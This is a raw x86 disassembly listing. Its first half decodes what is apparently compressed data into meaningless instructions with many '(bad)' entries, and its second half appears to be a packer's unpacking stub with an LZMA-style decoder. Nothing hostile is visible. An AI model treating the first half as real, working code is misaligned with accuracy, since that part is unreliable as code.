  6bdbcd:	mov    al,ds:0x9e6d6bfc
  6bdbd2:	jle    0x6bdc1f
  6bdbd4:	call   0x2c2461c8
  6bdbd9:	in     eax,dx
  6bdbda:	ror    DWORD PTR [eax+ebp*8],1
  6bdbdd:	loopne 0x6bdba3
  6bdbdf:	jae    0x6bdb70
  6bdbe1:	leave  
  6bdbe2:	sar    BYTE PTR [ecx+0x2288e2d7],1
  6bdbe8:	leave  
  6bdbe9:	call   0x6b9d:0x93bd286
  6bdbf0:	mov    al,0xbb
  6bdbf2:	mov    dl,0xb2
  6bdbf4:	call   0x90bb2f5b
  6bdbf9:	je     0x6bdc65
  6bdbfb:	cmp    esp,esp
  6bdbfd:	fwait
  6bdbfe:	jne    0x6bdc16
  6bdc00:	std    
  6bdc01:	xchg   BYTE PTR [edi+edi*1-0x4],bh
  6bdc05:	inc    eax
  6bdc06:	inc    ecx
  6bdc07:	enter  0x5f2a,0x6d
  6bdc0b:	push   0x15
  6bdc0d:	push   edx
  6bdc0e:	iret   
  6bdc0f:	in     al,0x61
  6bdc11:	mov    bl,0x93
  6bdc13:	fdiv   DWORD PTR [eax-0x4b8c45cd]
  6bdc19:	sub    al,0x80
  6bdc1b:	xchg   edi,eax
  6bdc1c:	xchg   ecx,eax
  6bdc1d:	sar    DWORD PTR [edi+eiz*4],0xcf
  6bdc21:	imul   edi,esp,0xfffffffa
  6bdc24:	mov    cl,0x2
  6bdc26:	cli    
  6bdc27:	popf   
  6bdc28:	call   0x8695:0x52cbe969
  6bdc2f:	xor    al,BYTE PTR [edi+0x67]
  6bdc32:	or     dl,BYTE PTR [eax-0x65ca1422]
  6bdc38:	shl    DWORD PTR [ebx],0x15
  6bdc3b:	mov    eax,0x655d6369
  6bdc40:	out    dx,al
  6bdc41:	outs   dx,BYTE PTR ds:[esi]
  6bdc42:	inc    esi
  6bdc43:	inc    edi
  6bdc44:	es mov ch,0xff
  6bdc47:	stos   BYTE PTR es:[edi],al
  6bdc48:	(bad)  
  6bdc49:	dec    esp
  6bdc4a:	or     BYTE PTR [ebx-0x3d459ced],cl
  6bdc50:	or     eax,0xa5bde1d8
  6bdc55:	jns    0x6bdc88
  6bdc57:	add    eax,0x52021d0f
  6bdc5c:	lahf   
  6bdc5d:	and    BYTE PTR [esi],0x4f
  6bdc60:	mov    al,0x23
  6bdc62:	arpl   WORD PTR [edi+0x65b6e6b6],si
  6bdc68:	das    
  6bdc69:	addr16 sbb edx,eax
  6bdc6c:	das    
  6bdc6d:	rol    bh,1
  6bdc6f:	loopne 0x6bdc05
  6bdc71:	mov    eax,ds:0xbdc18f48
  6bdc76:	pop    edx
  6bdc77:	sub    ah,BYTE PTR [esi]
  6bdc79:	stc    
  6bdc7a:	xor    cl,dl
  6bdc7c:	jmp    0x107b:0xa9fc3fb3
  6bdc83:	ins    DWORD PTR es:[edi],dx
  6bdc84:	test   esp,ebx
  6bdc86:	cmp    DWORD PTR [edi+0x73],ecx
  6bdc89:	enter  0xacaf,0x33
  6bdc8d:	or     al,0x8f
  6bdc8f:	inc    edi
  6bdc90:	fistp  WORD PTR fs:[edi+0x43]
  6bdc94:	hlt    
  6bdc95:	sti    
  6bdc96:	jg     0x6bdc38
  6bdc98:	in     al,dx
  6bdc99:	int3   
  6bdc9a:	rcl    DWORD PTR ds:0xb9cbd91d,1
  6bdca0:	mov    edx,0xb8139b2d
  6bdca5:	mov    bl,0x15
  6bdca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bdca8:	mov    eax,ds:0xfef83aad
  6bdcad:	sbb    BYTE PTR [eax+ecx*4],al
  6bdcb0:	adc    BYTE PTR [eax+0x61ade6ec],dl
  6bdcb6:	aad    0x43
  6bdcb8:	ja     0x6bdd12
  6bdcba:	and    eax,0x7f4d076
  6bdcbf:	xor    BYTE PTR [eax-0x69372656],bl
  6bdcc5:	shl    ah,cl
  6bdcc7:	pusha  
  6bdcc8:	out    dx,al
  6bdcc9:	pop    eax
  6bdcca:	test   eax,0x95286f65
  6bdccf:	aas    
  6bdcd0:	or     ebp,DWORD PTR [ebp-0x5f]
  6bdcd3:	sbb    eax,0xe1f70c00
  6bdcd8:	cli    
  6bdcd9:	(bad)  
  6bdcda:	into   
  6bdcdb:	imul   edi,edi,0xffffff80
  6bdcde:	aaa    
  6bdcdf:	or     al,BYTE PTR [edi]
  6bdce1:	int3   
  6bdce2:	(bad)  
  6bdce3:	xchg   ecx,eax
  6bdce4:	not    DWORD PTR [edx]
  6bdce6:	add    BYTE PTR [ebx-0x35],bh
  6bdce9:	mov    bl,0xd9
  6bdceb:	mov    ebp,0x23689609
  6bdcf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bdcf1:	ja     0x6bdd35
  6bdcf3:	mov    ebp,0x17c7ed07
  6bdcf8:	inc    edx
  6bdcf9:	(bad)  
  6bdcfa:	rol    BYTE PTR [ebx],cl
  6bdcfc:	xor    esi,edi
  6bdcfe:	mov    DWORD PTR [eax-0xf],eax
  6bdd01:	jb     0x6bdc83
  6bdd03:	or     eax,0xe6a5bd2b
  6bdd08:	cmp    al,0x52
  6bdd0a:	jmp    0x54dc:0xa4042cfc
  6bdd11:	(bad)  
  6bdd12:	nop
  6bdd13:	or     al,0xf1
  6bdd15:	adc    BYTE PTR [ebp-0x74],cl
  6bdd18:	mov    dl,0x2
  6bdd1a:	shl    BYTE PTR [edx],1
  6bdd1c:	popf   
  6bdd1d:	inc    esi
  6bdd1e:	sti    
  6bdd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bdd20:	inc    esi
  6bdd21:	adc    BYTE PTR [edx-0x4d],0x39
  6bdd25:	xor    DWORD PTR [esi+ebx*4+0xd],0x70
  6bdd2a:	fist   DWORD PTR [ecx+0x15569ce0]
  6bdd30:	(bad)  
  6bdd31:	cmp    ebx,DWORD PTR [edx-0x88f8a76]
  6bdd37:	mov    eax,ds:0x5bb5825d
  6bdd3c:	inc    esi
  6bdd3d:	pop    es
  6bdd3e:	adc    dl,0x5d
  6bdd41:	and    al,0x0
  6bdd43:	rcr    BYTE PTR [eax-0x5c],1
  6bdd46:	xchg   edx,eax
  6bdd47:	(bad)  
  6bdd48:	loop   0x6bdd65
  6bdd4a:	push   ss
  6bdd4b:	xor    edx,ecx
  6bdd4d:	fsubrp st(7),st
  6bdd4f:	pusha  
  6bdd50:	jecxz  0x6bdd7f
  6bdd52:	cmp    al,0x27
  6bdd54:	mov    esi,0x3976c49c
  6bdd59:	sbb    dl,BYTE PTR [edi+0x6a]
  6bdd5c:	cmp    ch,BYTE PTR [esi-0x3aa012b4]
  6bdd62:	or     al,0xaa
  6bdd64:	push   esi
  6bdd65:	xor    dl,BYTE PTR [edi+0x7]
  6bdd68:	xor    BYTE PTR [esi],ah
  6bdd6a:	ins    DWORD PTR es:[edi],dx
  6bdd6b:	mov    dh,0x7a
  6bdd6d:	inc    esi
  6bdd6e:	shl    BYTE PTR [esi+0x5b3af430],cl
  6bdd74:	(bad)  
  6bdd75:	cmp    BYTE PTR [edx],cl
  6bdd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bdd78:	xchg   esp,eax
  6bdd79:	outs   dx,BYTE PTR ds:[esi]
  6bdd7a:	jno    0x6bddab
  6bdd7c:	xchg   edi,eax
  6bdd7d:	mov    bh,0x3b
  6bdd7f:	jecxz  0x6bdda7
  6bdd81:	repnz dec edx
  6bdd83:	les    esi,FWORD PTR [eax]
  6bdd85:	cmp    esp,esi
  6bdd87:	stc    
  6bdd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bdd89:	adc    DWORD PTR [ebp-0x7bf51700],0x6d981ae7
  6bdd93:	ins    BYTE PTR es:[edi],dx
  6bdd94:	loopne 0x6bdd97
  6bdd96:	ficomp WORD PTR [esi-0x5a04b229]
  6bdd9c:	cli    
  6bdd9d:	nop
  6bdd9e:	stos   DWORD PTR es:[edi],eax
  6bdd9f:	enter  0x4405,0xe
  6bdda3:	dec    eax
  6bdda4:	ins    BYTE PTR es:[edi],dx
  6bdda5:	mov    dl,0xbb
  6bdda7:	jbe    0x6bdde8
  6bdda9:	push   edx
  6bddaa:	jns    0x6bdd92
  6bddac:	std    
  6bddad:	loop   0x6bdd64
  6bddaf:	xchg   ebp,eax
  6bddb0:	mov    edi,0xcbd25c25
  6bddb5:	test   BYTE PTR [edi+0x5ef3b341],0x1b
  6bddbc:	sbb    dl,cl
  6bddbe:	jns    0x6bdd61
  6bddc0:	mov    esi,0x2ce41c22
  6bddc5:	rcl    DWORD PTR [ebp-0x49],cl
  6bddc8:	xlat   BYTE PTR ds:[ebx]
  6bddc9:	jmp    0xabb2:0x7f430153
  6bddd0:	arpl   WORD PTR [eax],di
  6bddd2:	pop    es
  6bddd3:	add    BYTE PTR [ecx],dh
  6bddd5:	mov    ebp,0x4ec17718
  6bddda:	mov    ds:0x5760ae9c,al
  6bdddf:	push   es
  6bdde0:	cmp    al,0x43
  6bdde2:	sbb    edi,DWORD PTR [esi]
  6bdde4:	ret    0x63c0
  6bdde7:	dec    ebp
  6bdde8:	ins    DWORD PTR es:[edi],dx
  6bdde9:	test   eax,0xba2bd84d
  6bddee:	mov    ebx,0x2857b7c4
  6bddf3:	fstp   QWORD PTR [edi]
  6bddf5:	or     al,BYTE PTR [edx+0x7875ac2f]
  6bddfb:	je     0x6bddb9
  6bddfd:	aam    0x83
  6bddff:	ret    0xa080
  6bde02:	fwait
  6bde03:	inc    ebp
  6bde04:	retf   0x7ed7
  6bde07:	ds push ax
  6bde0a:	or     BYTE PTR [esi+edi*1-0x50],0xb5
  6bde0f:	cmp    cl,BYTE PTR [edx+0x41b949b6]
  6bde15:	jno    0x6bde19
  6bde17:	sbb    DWORD PTR [edx-0x8b2a8a9],0xffffff98
  6bde1e:	push   ss
  6bde1f:	adc    eax,0xe839e895
  6bde24:	div    BYTE PTR [ebp+edi*2-0x75f4bba7]
  6bde2b:	push   0x2525e480
  6bde30:	xor    esi,DWORD PTR [edi*1+0x49c565cd]
  6bde37:	inc    edi
  6bde38:	and    al,0x21
  6bde3a:	(bad)  
  6bde3b:	jae    0x6bddd6
  6bde3d:	jmp    0x6bde4b
  6bde3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bde40:	retf   
  6bde41:	jbe    0x6bde28
  6bde43:	inc    edi
  6bde44:	sbb    al,0x18
  6bde46:	inc    eax
  6bde47:	lock (bad) 
  6bde49:	xlat   BYTE PTR ds:[ebx]
  6bde4a:	in     eax,0xa4
  6bde4c:	xor    al,0x80
  6bde4e:	mov    edi,0xd7efad66
  6bde53:	stc    
  6bde54:	hlt    
  6bde55:	dec    esi
  6bde56:	jle    0x6bdea4
  6bde58:	jne    0x6bdea2
  6bde5a:	mov    DWORD PTR [eax+0x430399dd],esi
  6bde60:	in     eax,0x58
  6bde62:	xchg   esp,eax
  6bde63:	imul   edi,eax,0x93710427
  6bde69:	add    al,0x53
  6bde6b:	aad    0x49
  6bde6d:	nop
  6bde6e:	mov    al,ds:0xc50074a7
  6bde73:	add    al,0xd1
  6bde75:	mov    ebp,0x8738c7c7
  6bde7a:	mov    ecx,0xe379be06
  6bde7f:	mov    DWORD PTR [ecx-0x1bb2eafa],esi
  6bde85:	jno    0x6bde44
  6bde87:	mov    al,ds:0x8be0ea69
  6bde8c:	mov    ch,0xea
  6bde8e:	inc    ebp
  6bde8f:	popf   
  6bde90:	ret    
  6bde91:	test   DWORD PTR [eax],0xbbf5602b
  6bde97:	sub    eax,eax
  6bde99:	cwde   
  6bde9a:	lea    edi,[edx-0x4d76c006]
  6bdea0:	addr16 and al,0x2a
  6bdea3:	imul   BYTE PTR [edx-0x4779f458]
  6bdea9:	int    0xc3
  6bdeab:	fbld   TBYTE PTR [esi+0x797f0395]
  6bdeb1:	sahf   
  6bdeb2:	enter  0x9ed6,0xab
  6bdeb6:	arpl   WORD PTR [esi+0x70],bp
  6bdeb9:	fs es pop esi
  6bdebc:	jle    0x6bde4c
  6bdebe:	lds    ecx,FWORD PTR [edx+0x1e032eb5]
  6bdec4:	(bad)  
  6bdec5:	jnp    0x6bded9
  6bdec7:	inc    ebp
  6bdec8:	je     0x6bdef6
  6bdeca:	mov    esi,0x4cc62575
  6bdecf:	outs   dx,DWORD PTR ds:[esi]
  6bded0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bded1:	out    dx,eax
  6bded2:	int    0x84
  6bded4:	sbb    eax,0x3c575aa5
  6bded9:	xchg   edx,eax
  6bdeda:	dec    eax
  6bdedb:	jp     0x6bdeb9
  6bdedd:	xor    ebx,esp
  6bdedf:	stos   DWORD PTR es:[edi],eax
  6bdee0:	push   ss
  6bdee1:	or     al,0x43
  6bdee3:	pop    ebp
  6bdee4:	lods   eax,DWORD PTR ds:[esi]
  6bdee5:	sbb    BYTE PTR [esi+0x3e2926ea],dl
  6bdeeb:	sbb    BYTE PTR [eax+0x4f8e15ce],ah
  6bdef1:	mov    edi,0xffadf14e
  6bdef6:	add    eax,0x9b4b8392
  6bdefb:	jae    0x6bdeed
  6bdefd:	xchg   ebx,eax
  6bdefe:	jne    0x6bdf12
  6bdf00:	int3   
  6bdf01:	jbe    0x6bdf36
  6bdf03:	cmc    
  6bdf04:	sti    
  6bdf05:	cmp    edi,edi
  6bdf07:	test   BYTE PTR [esi-0x79],0xb3
  6bdf0b:	sub    dh,al
  6bdf0d:	aas    
  6bdf0e:	push   0x3e9b9b2b
  6bdf13:	add    ch,BYTE PTR [eax-0x4f221de9]
  6bdf19:	sbb    DWORD PTR [edx-0x27],edi
  6bdf1c:	lods   eax,DWORD PTR ds:[esi]
  6bdf1d:	adc    BYTE PTR [esp+eiz*8-0x180e6bac],dl
  6bdf24:	push   ds
  6bdf25:	sub    ebx,DWORD PTR [ebx+0x68]
  6bdf28:	pop    DWORD PTR [edi+0x6bed209c]
  6bdf2e:	jno    0x6bdf50
  6bdf30:	test   DWORD PTR ds:0x8da8eb84,eax
  6bdf36:	xchg   ecx,eax
  6bdf37:	mov    dh,0xb
  6bdf39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bdf3a:	mov    BYTE PTR [edx-0x18b4157e],dl
  6bdf40:	test   al,0x25
  6bdf42:	cmp    eax,0xd4ad2ec6
  6bdf47:	mov    edx,0x600f71e7
  6bdf4c:	ret    
  6bdf4d:	jmp    0x99a:0x21b0
  6bdf53:	add    esp,eax
  6bdf55:	loope  0x6bdfcf
  6bdf57:	cmp    ebx,DWORD PTR [esi]
  6bdf59:	push   esi
  6bdf5a:	mov    ebp,DWORD PTR [edi+0x32c864d6]
  6bdf60:	out    0xc4,al
  6bdf62:	and    eax,0x515117ee
  6bdf67:	ret    0xda50
  6bdf6a:	stos   BYTE PTR es:[edi],al
  6bdf6b:	push   ebp
  6bdf6c:	shl    DWORD PTR [esi],cl
  6bdf6e:	fwait
  6bdf6f:	push   ebp
  6bdf70:	mov    bl,0xa2
  6bdf72:	test   bl,cl
  6bdf74:	and    DWORD PTR [edi-0x45],0x4f
  6bdf78:	les    edi,FWORD PTR [esp+ecx*1-0x10]
  6bdf7c:	pop    edi
  6bdf7d:	out    dx,eax
  6bdf7e:	into   
  6bdf7f:	je     0x6bdfdc
  6bdf81:	jmp    0x6bdf25
  6bdf83:	popf   
  6bdf84:	(bad)  
  6bdf85:	loopne 0x6bdfc6
  6bdf87:	or     edi,edx
  6bdf89:	sahf   
  6bdf8a:	fidiv  DWORD PTR [ebx]
  6bdf8c:	jne    0x6bdfa7
  6bdf8e:	xchg   ecx,eax
  6bdf8f:	lea    edx,[edi-0x432c943a]
  6bdf95:	add    eax,0x4108bcc6
  6bdf9a:	sub    al,0xf0
  6bdf9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bdf9d:	push   ebx
  6bdf9e:	cmc    
  6bdf9f:	sbb    al,0xae
  6bdfa1:	imul   ebx,esp,0x3642b919
  6bdfa7:	add    al,0xc4
  6bdfa9:	dec    ebp
  6bdfaa:	out    dx,eax
  6bdfab:	rol    cl,1
  6bdfad:	mov    dh,0x45
  6bdfaf:	inc    esi
  6bdfb0:	push   eax
  6bdfb1:	inc    esp
  6bdfb2:	inc    ebp
  6bdfb3:	je     0x6bdf3d
  6bdfb5:	clc    
  6bdfb6:	xor    al,BYTE PTR [ebx+0x1e]
  6bdfb9:	jne    0x6bdf5e
  6bdfbb:	imul   edx,DWORD PTR [ecx+ecx*8-0x8],0xffffffc0
  6bdfc0:	arpl   WORD PTR [esi+0x7f7ef7f5],di
  6bdfc6:	sbb    cl,BYTE PTR [ecx]
  6bdfc8:	push   0xc7e95fec
  6bdfcd:	adc    ch,BYTE PTR [esi]
  6bdfcf:	sbb    al,0x2e
  6bdfd1:	adc    BYTE PTR [edx+0x12],dh
  6bdfd4:	cmp    al,0x9b
  6bdfd6:	mov    eax,edx
  6bdfd8:	jb     0x6be000
  6bdfda:	inc    ebp
  6bdfdb:	sar    DWORD PTR [ebx-0x589343c7],0x1f
  6bdfe2:	mov    DWORD PTR [esp+ebp*2],edx
  6bdfe5:	sbb    eax,0xcbae9178
  6bdfea:	inc    ecx
  6bdfeb:	int    0x48
  6bdfed:	pop    ds
  6bdfee:	popa   
  6bdfef:	ror    bh,1
  6bdff1:	push   ecx
  6bdff2:	sbb    ebx,ebx
  6bdff4:	shl    DWORD PTR [edi],cl
  6bdff6:	sbb    ebx,0x59
  6bdff9:	jg     0x6bdfb0
  6bdffb:	inc    edx
  6bdffc:	in     eax,dx
  6bdffd:	fbstp  TBYTE PTR [eax]
  6bdfff:	ins    BYTE PTR es:[edi],dx
  6be000:	mov    esi,0x8838e92b
  6be005:	jns    0x6be011
  6be007:	aam    0x4b
  6be009:	test   al,0x63
  6be00b:	out    dx,al
  6be00c:	mov    edi,0xc2da376f
  6be011:	pop    esi
  6be012:	mov    BYTE PTR [ebp-0x5e],bl
  6be015:	loop   0x6be008
  6be017:	push   cs
  6be018:	lods   eax,DWORD PTR ds:[esi]
  6be019:	jg     0x6bdfa3
  6be01b:	mov    ah,0x48
  6be01d:	scas   eax,DWORD PTR es:[edi]
  6be01e:	cmp    bl,BYTE PTR [esp+eax*1]
  6be021:	rcl    ebp,0x8f
  6be024:	fisub  DWORD PTR [ebx+0x7c]
  6be02a:	add    BYTE PTR [eax],al
  6be02c:	add    BYTE PTR [eax],al
  6be02e:	add    BYTE PTR [eax],al
  6be030:	pusha  
  6be031:	mov    esi,0x690000
  6be036:	lea    edi,[esi-0x28f000]
  6be03c:	push   edi
  6be03d:	mov    ebp,esp
  6be03f:	lea    ebx,[esp-0x3e80]
  6be046:	xor    eax,eax
  6be048:	push   eax
  6be049:	cmp    esp,ebx
  6be04b:	jne    0x6be048
  6be04d:	inc    esi
  6be04e:	inc    esi
  6be04f:	push   ebx
  6be050:	push   0x2bc669
  6be055:	push   edi
  6be056:	add    ebx,0x4
  6be059:	push   ebx
  6be05a:	push   0x2e026
  6be05f:	push   esi
  6be060:	add    ebx,0x4
  6be063:	push   ebx
  6be064:	push   eax
  6be065:	mov    DWORD PTR [ebx],0x20003
  6be06b:	nop
  6be06c:	nop
  6be06d:	nop
  6be06e:	nop
  6be06f:	nop
  6be070:	push   ebp
  6be071:	push   edi
  6be072:	push   esi
  6be073:	push   ebx
  6be074:	sub    esp,0x7c
  6be077:	mov    edx,DWORD PTR [esp+0x90]
  6be07e:	mov    DWORD PTR [esp+0x74],0x0
  6be086:	mov    BYTE PTR [esp+0x73],0x0
  6be08b:	mov    ebp,DWORD PTR [esp+0x9c]
  6be092:	lea    eax,[edx+0x4]
  6be095:	mov    DWORD PTR [esp+0x78],eax
  6be099:	mov    eax,0x1
  6be09e:	movzx  ecx,BYTE PTR [edx+0x2]
  6be0a2:	mov    ebx,eax
  6be0a4:	shl    ebx,cl
  6be0a6:	mov    ecx,ebx
  6be0a8:	dec    ecx
  6be0a9:	mov    DWORD PTR [esp+0x6c],ecx
  6be0ad:	movzx  ecx,BYTE PTR [edx+0x1]
  6be0b1:	shl    eax,cl
  6be0b3:	dec    eax
  6be0b4:	mov    DWORD PTR [esp+0x68],eax
  6be0b8:	mov    eax,DWORD PTR [esp+0xa8]
  6be0bf:	movzx  esi,BYTE PTR [edx]
  6be0c2:	mov    DWORD PTR [ebp+0x0],0x0
  6be0c9:	mov    DWORD PTR [esp+0x60],0x0
  6be0d1:	mov    DWORD PTR [eax],0x0
  6be0d7:	mov    eax,0x300
  6be0dc:	mov    DWORD PTR [esp+0x64],esi
  6be0e0:	mov    DWORD PTR [esp+0x5c],0x1
  6be0e8:	mov    DWORD PTR [esp+0x58],0x1
  6be0f0:	mov    DWORD PTR [esp+0x54],0x1
  6be0f8:	mov    DWORD PTR [esp+0x50],0x1
  6be100:	movzx  ecx,BYTE PTR [edx+0x1]
  6be104:	add    ecx,esi
  6be106:	shl    eax,cl
  6be108:	lea    ecx,[eax+0x736]
  6be10e:	cmp    DWORD PTR [esp+0x74],ecx
  6be112:	jae    0x6be122
  6be114:	mov    eax,DWORD PTR [esp+0x78]
  6be118:	mov    WORD PTR [eax],0x400
  6be11d:	add    eax,0x2
  6be120:	loop   0x6be118
  6be122:	mov    ebx,DWORD PTR [esp+0x94]
  6be129:	xor    edi,edi
  6be12b:	mov    DWORD PTR [esp+0x48],0xffffffff
  6be133:	mov    edx,ebx
  6be135:	add    edx,DWORD PTR [esp+0x98]
  6be13c:	mov    DWORD PTR [esp+0x4c],edx
  6be140:	xor    edx,edx
  6be142:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be146:	je     0x6beac8
  6be14c:	movzx  eax,BYTE PTR [ebx]
  6be14f:	shl    edi,0x8
  6be152:	inc    edx
  6be153:	inc    ebx
  6be154:	or     edi,eax
  6be156:	cmp    edx,0x4
  6be159:	jle    0x6be142
  6be15b:	mov    ecx,DWORD PTR [esp+0xa4]
  6be162:	cmp    DWORD PTR [esp+0x74],ecx
  6be166:	jae    0x6bead0
  6be16c:	mov    esi,DWORD PTR [esp+0x74]
  6be170:	and    esi,DWORD PTR [esp+0x6c]
  6be174:	mov    eax,DWORD PTR [esp+0x60]
  6be178:	mov    edx,DWORD PTR [esp+0x78]
  6be17c:	shl    eax,0x4
  6be17f:	mov    DWORD PTR [esp+0x44],esi
  6be183:	add    eax,esi
  6be185:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be18d:	lea    ebp,[edx+eax*2]
  6be190:	ja     0x6be1aa
  6be192:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be196:	je     0x6beac8
  6be19c:	shl    DWORD PTR [esp+0x48],0x8
  6be1a1:	movzx  eax,BYTE PTR [ebx]
  6be1a4:	shl    edi,0x8
  6be1a7:	inc    ebx
  6be1a8:	or     edi,eax
  6be1aa:	mov    eax,DWORD PTR [esp+0x48]
  6be1ae:	mov    dx,WORD PTR [ebp+0x0]
  6be1b2:	shr    eax,0xb
  6be1b5:	movzx  ecx,dx
  6be1b8:	imul   eax,ecx
  6be1bb:	cmp    edi,eax
  6be1bd:	jae    0x6be3a0
  6be1c3:	mov    DWORD PTR [esp+0x48],eax
  6be1c7:	mov    eax,0x800
  6be1cc:	sub    eax,ecx
  6be1ce:	mov    cl,BYTE PTR [esp+0x64]
  6be1d2:	sar    eax,0x5
  6be1d5:	mov    esi,0x1
  6be1da:	lea    eax,[edx+eax*1]
  6be1dd:	movzx  edx,BYTE PTR [esp+0x73]
  6be1e2:	mov    WORD PTR [ebp+0x0],ax
  6be1e6:	mov    eax,DWORD PTR [esp+0x74]
  6be1ea:	and    eax,DWORD PTR [esp+0x68]
  6be1ee:	mov    ebp,DWORD PTR [esp+0x78]
  6be1f2:	shl    eax,cl
  6be1f4:	mov    ecx,0x8
  6be1f9:	sub    ecx,DWORD PTR [esp+0x64]
  6be1fd:	sar    edx,cl
  6be1ff:	add    eax,edx
  6be201:	imul   eax,eax,0x600
  6be207:	cmp    DWORD PTR [esp+0x60],0x6
  6be20c:	lea    eax,[ebp+eax*1+0xe6c]
  6be213:	mov    DWORD PTR [esp+0x14],eax
  6be217:	jle    0x6be2e7
  6be21d:	mov    eax,DWORD PTR [esp+0x74]
  6be221:	sub    eax,DWORD PTR [esp+0x5c]
  6be225:	mov    edx,DWORD PTR [esp+0xa0]
  6be22c:	movzx  eax,BYTE PTR [edx+eax*1]
  6be230:	mov    DWORD PTR [esp+0x40],eax
  6be234:	shl    DWORD PTR [esp+0x40],1
  6be238:	mov    ecx,DWORD PTR [esp+0x40]
  6be23c:	lea    edx,[esi+esi*1]
  6be23f:	mov    ebp,DWORD PTR [esp+0x14]
  6be243:	and    ecx,0x100
  6be249:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be251:	lea    eax,[ebp+ecx*2+0x0]
  6be255:	mov    DWORD PTR [esp+0x3c],ecx
  6be259:	lea    ebp,[eax+edx*1]
  6be25c:	ja     0x6be276
  6be25e:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be262:	je     0x6beac8
  6be268:	shl    DWORD PTR [esp+0x48],0x8
  6be26d:	movzx  eax,BYTE PTR [ebx]
  6be270:	shl    edi,0x8
  6be273:	inc    ebx
  6be274:	or     edi,eax
  6be276:	mov    eax,DWORD PTR [esp+0x48]
  6be27a:	mov    cx,WORD PTR [ebp+0x200]
  6be281:	shr    eax,0xb
  6be284:	movzx  esi,cx
  6be287:	imul   eax,esi
  6be28a:	cmp    edi,eax
  6be28c:	jae    0x6be2b1
  6be28e:	mov    DWORD PTR [esp+0x48],eax
  6be292:	mov    eax,0x800
  6be297:	sub    eax,esi
  6be299:	mov    esi,edx
  6be29b:	sar    eax,0x5
  6be29e:	cmp    DWORD PTR [esp+0x3c],0x0
  6be2a3:	lea    eax,[ecx+eax*1]
  6be2a6:	mov    WORD PTR [ebp+0x200],ax
  6be2ad:	je     0x6be2d1
  6be2af:	jmp    0x6be2df
  6be2b1:	sub    DWORD PTR [esp+0x48],eax
  6be2b5:	sub    edi,eax
  6be2b7:	mov    eax,ecx
  6be2b9:	lea    esi,[edx+0x1]
  6be2bc:	shr    ax,0x5
  6be2c0:	sub    cx,ax
  6be2c3:	cmp    DWORD PTR [esp+0x3c],0x0
  6be2c8:	mov    WORD PTR [ebp+0x200],cx
  6be2cf:	je     0x6be2df
  6be2d1:	cmp    esi,0xff
  6be2d7:	jle    0x6be234
  6be2dd:	jmp    0x6be358
  6be2df:	cmp    esi,0xff
  6be2e5:	jg     0x6be358
  6be2e7:	lea    edx,[esi+esi*1]
  6be2ea:	mov    ebp,DWORD PTR [esp+0x14]
  6be2ee:	add    ebp,edx
  6be2f0:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be2f8:	ja     0x6be312
  6be2fa:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be2fe:	je     0x6beac8
  6be304:	shl    DWORD PTR [esp+0x48],0x8
  6be309:	movzx  eax,BYTE PTR [ebx]
  6be30c:	shl    edi,0x8
  6be30f:	inc    ebx
  6be310:	or     edi,eax
  6be312:	mov    eax,DWORD PTR [esp+0x48]
  6be316:	mov    cx,WORD PTR [ebp+0x0]
  6be31a:	shr    eax,0xb
  6be31d:	movzx  esi,cx
  6be320:	imul   eax,esi
  6be323:	cmp    edi,eax
  6be325:	jae    0x6be340
  6be327:	mov    DWORD PTR [esp+0x48],eax
  6be32b:	mov    eax,0x800
  6be330:	sub    eax,esi
  6be332:	mov    esi,edx
  6be334:	sar    eax,0x5
  6be337:	lea    eax,[ecx+eax*1]
  6be33a:	mov    WORD PTR [ebp+0x0],ax
  6be33e:	jmp    0x6be2df
  6be340:	sub    DWORD PTR [esp+0x48],eax
  6be344:	sub    edi,eax
  6be346:	mov    eax,ecx
  6be348:	lea    esi,[edx+0x1]
  6be34b:	shr    ax,0x5
  6be34f:	sub    cx,ax
  6be352:	mov    WORD PTR [ebp+0x0],cx
  6be356:	jmp    0x6be2df
  6be358:	mov    edx,DWORD PTR [esp+0x74]
  6be35c:	mov    eax,esi
  6be35e:	mov    ecx,DWORD PTR [esp+0xa0]
  6be365:	mov    BYTE PTR [esp+0x73],al
  6be369:	mov    BYTE PTR [edx+ecx*1],al
  6be36c:	inc    edx
  6be36d:	cmp    DWORD PTR [esp+0x60],0x3
  6be372:	mov    DWORD PTR [esp+0x74],edx
  6be376:	jg     0x6be385
  6be378:	mov    DWORD PTR [esp+0x60],0x0
  6be380:	jmp    0x6beaa0
  6be385:	cmp    DWORD PTR [esp+0x60],0x9
  6be38a:	jg     0x6be396
  6be38c:	sub    DWORD PTR [esp+0x60],0x3
  6be391:	jmp    0x6beaa0
  6be396:	sub    DWORD PTR [esp+0x60],0x6
  6be39b:	jmp    0x6beaa0
  6be3a0:	mov    ecx,DWORD PTR [esp+0x48]
  6be3a4:	sub    edi,eax
  6be3a6:	mov    esi,DWORD PTR [esp+0x60]
  6be3aa:	sub    ecx,eax
  6be3ac:	mov    eax,edx
  6be3ae:	shr    ax,0x5
  6be3b2:	sub    dx,ax
  6be3b5:	cmp    ecx,0xffffff
  6be3bb:	mov    WORD PTR [ebp+0x0],dx
  6be3bf:	mov    ebp,DWORD PTR [esp+0x78]
  6be3c3:	lea    esi,[ebp+esi*2+0x0]
  6be3c7:	mov    DWORD PTR [esp+0x38],esi
  6be3cb:	ja     0x6be3e3
  6be3cd:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be3d1:	je     0x6beac8
  6be3d7:	movzx  eax,BYTE PTR [ebx]
  6be3da:	shl    edi,0x8
  6be3dd:	shl    ecx,0x8
  6be3e0:	inc    ebx
  6be3e1:	or     edi,eax
  6be3e3:	mov    ebp,DWORD PTR [esp+0x38]
  6be3e7:	mov    eax,ecx
  6be3e9:	shr    eax,0xb
